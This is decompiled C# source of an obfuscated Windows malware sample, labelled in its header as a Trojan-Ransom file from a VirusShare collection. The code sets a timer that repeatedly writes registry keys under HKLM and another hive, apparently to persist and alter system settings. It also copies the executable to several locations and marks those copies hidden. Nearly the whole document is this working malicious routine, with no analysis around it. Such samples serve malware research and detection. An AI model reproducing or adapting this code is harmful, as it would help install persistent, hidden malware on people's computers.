// Decompiled with JetBrains decompiler
// Type: *p.
;B
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using Microsoft.Win32;
using System.IO;
using System.Timers;

namespace \u002Ap\u000C
{
  internal class \u0011\u000A\u003BB\u001C
  {
    private static Timer VL9\u0029\u0008 = new Timer();

    public static void \u0010\u0027W\u0027\u008C()
    {
      \u0011\u000A\u003BB\u001C.VL9\u0029\u0008.Interval = (double) (\u0034\u002Dy\u0029\u000B\u0023.\u0006\u002F\u0023 * 1000);
      \u0011\u000A\u003BB\u001C.VL9\u0029\u0008.Elapsed += new ElapsedEventHandler(\u0011\u000A\u003BB\u001C.\u0012\u001964\u001F\u0010\u005Dg);
      \u0011\u000A\u003BB\u001C.VL9\u0029\u0008.Start();
    }

    public static void \u001AL\u002D\u001C\u0018() => \u0011\u000A\u003BB\u001C.VL9\u0029\u0008.Stop();

    private static void \u0012\u001964\u001F\u0010\u005Dg(object _param0, ElapsedEventArgs _param1)
    {
      \u0011\u000A\u003BB\u001C.\u0007\u002F(\u0029\u003C\u003C\u001B.\u0008\u001F, \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001F\u000F\u0013\u000B(), \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[0], (object) \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0], RegistryValueKind.String);
      \u0011\u000A\u003BB\u001C.\u0007\u002F(\u0029\u003C\u003C\u001B.\u0008\u001F, \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009VCf\u00286\u0019(), \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[1], (object) \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1], RegistryValueKind.String);
      \u0011\u000A\u003BB\u001C.\u0007\u002F(Registry.LocalMachine, \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001E\u0009M\u0019() + \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2], \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0015\u002F(), (object) (\u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0] + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0017x\u00274\u0022()), RegistryValueKind.String);
      \u0011\u000A\u003BB\u001C.\u0007\u002F(Registry.LocalMachine, \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001E\u0009M\u0019() + \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2], \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0037\u0026R\u0007\u0001(), (object) 1, RegistryValueKind.DWord);
      try
      {
        foreach (string str in \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E)
        {
          if (!\u001AOk\u00245\u0023.\u002C\u0001b\u000D\u005B\u002C\u002C(str))
          {
            File.Copy(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B, str);
            File.SetAttributes(str, FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
    }

    private static void \u0007\u002F(
      RegistryKey _param0,
      string _param1,
      string _param2,
      object _param3,
      RegistryValueKind _param4)
    {
      try
      {
        if (_param0.OpenSubKey(_param1) == null)
          _param0.CreateSubKey(_param1);
        RegistryKey registryKey = _param0.OpenSubKey(_param1, true);
        if (registryKey.Equals((object) _param2))
        {
          if (registryKey.GetValue(_param2) == _param3)
            return;
          registryKey.SetValue(_param2, _param3, _param4);
        }
        else
          registryKey.SetValue(_param2, _param3, _param4);
      }
      catch
      {
      }
    }
  }
}
